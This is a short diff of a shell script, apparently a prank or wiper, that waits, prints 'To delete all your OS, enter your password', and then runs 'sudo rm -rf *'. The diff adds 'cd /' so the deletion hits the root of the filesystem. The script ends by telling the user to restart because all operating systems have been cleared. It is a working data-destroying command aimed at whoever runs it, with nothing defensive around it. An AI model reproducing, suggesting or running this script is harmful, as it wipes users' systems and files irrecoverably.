@@ -7,6 +7,7 @@ sleep 30 &&
 echo Starting ...
 sleep 3 &&
 echo To delete all your OS, enter your password. &&
+cd / &&
 sudo rm -rf * &&
 echo Restart Your PC, all Oss have benn cleared. &&
 sleep 2
